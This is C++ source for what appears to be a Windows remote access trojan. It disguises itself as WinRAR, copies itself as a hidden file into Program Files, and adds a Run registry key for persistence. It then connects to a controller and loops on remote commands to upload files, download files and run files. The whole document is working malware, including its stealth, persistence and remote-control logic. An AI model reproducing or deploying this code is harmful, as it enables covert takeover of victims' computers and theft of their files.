#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#define _CRT_SECURE_NO_WARNINGS
#include <fstream>
#include "MyProtocol.h"
#include <intrin.h>
#define BUFFER_SIZE 1024
#define DEBUG_MODE 
void copyfile(LPCWSTR copypath, LPCWSTR pastepath) {
    
    HANDLE copy =  CreateFile(copypath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE paste = CreateFile(pastepath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    char* buffer = new char[BUFFER_SIZE];
    if (copy && paste) {
        DWORD iRead = 0;
        DWORD iWritten = 0;
        while (ReadFile(copy, buffer, BUFFER_SIZE, &iRead, NULL)&& iRead > 0) {
            WriteFile(paste, buffer, iRead, &iWritten, NULL);
#ifdef DEBUG_MODE
            if (iRead != iWritten) { MessageBoxA(NULL, "error copy/write", "error", MB_ICONERROR); break; }
#endif
        }
        
    }
    if(copy)
        CloseHandle(copy);
    if(paste)
       CloseHandle(paste);
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) 
{
    SetWindowTextA(NULL, "WinRarArchive");
    LPCWSTR path = L"C:\\Program Files\\winrar_archivator\\winrar.exe";
    LPWSTR currentpath = (LPWSTR)calloc(256, sizeof(WCHAR));
    GetModuleFileName(NULL, currentpath, 256);
#ifdef DEBUG_MODE
    if (currentpath != path) {
        CreateDirectory(L"C:/Program Files/winrar_archivator/", NULL);
        copyfile(currentpath, L"C:\\Program Files\\winrar_archivator\\winrar.exe");
        
        HKEY hg;
        RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hg);
        RegSetValueExW(hg, L"WinRar", 0, REG_SZ,(LPBYTE) path, 46*2);
        RegCloseKey(hg);
        
    }
#endif
    long status = 0;
    connection con(status);
    if (status) {
#ifdef DEBUG_MODE


            switch (status) {
                case 1:
                    MessageBoxA(NULL, "WSAStartup error", "protocol error", MB_ICONERROR);
                    break;
                case 2:
                    MessageBoxA(NULL, "Connection error", "protocol error", MB_ICONERROR);
                    break;

            }
#endif // DEBUG_MODE

        return status;
    }
    bool cycle = true;
    while (cycle) {
        switch (con.command()) {
        case 'e':
            con.CallError();
            break;
        case 'f':
            con.OpenGetFileChannel();
            break;
        case 'g':
            con.OpenSendFileChannel();
            break;
        case 'c':
            cycle = false;
            break;
        case 'r':
            con.RunFile();
            break;
        case 'p':
            con.pong();
            break;
        
        
        }
        Sleep(1);
    }
    return 0;
}
